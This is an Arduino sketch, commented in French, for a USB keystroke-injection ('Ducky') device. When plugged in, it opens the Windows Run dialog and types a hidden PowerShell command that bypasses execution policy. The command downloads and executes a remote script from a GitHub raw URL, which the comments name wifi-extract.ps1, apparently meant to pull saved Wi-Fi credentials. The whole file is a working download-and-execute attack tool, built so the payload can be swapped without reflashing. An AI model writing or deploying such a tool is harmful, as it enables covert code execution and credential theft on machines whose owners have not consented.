// Télécharge wifi-extract.ps1 depuis GitHub raw (HTTPS) et exécute — voir github_config.h
// Push sur BL4CK-SUN/Ducky → pas de reflash MCU pour changer le script PS.
#include "layout_config.h"
#include "github_config.h"
#include <Keyboard.h>

static const char PS_LAUNCH[] =
    "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ";

// Guillemets ASCII uniquement (pas de layout spécial).
static const char PS_CMD[] =
    "irm -UseBasicParsing '" PAYLOAD_URL "' | iex";

static const uint16_t PRE_DELAY_MS = 4000;

static void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(80);
  Keyboard.releaseAll();
  delay(600);
}

void setup() {
  keyboardBegin(TARGET_LAYOUT);
  delay(PRE_DELAY_MS);
  openRunDialog();
  typeString(PS_LAUNCH, TARGET_LAYOUT);
  typeString(PS_CMD, TARGET_LAYOUT);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
}

void loop() {}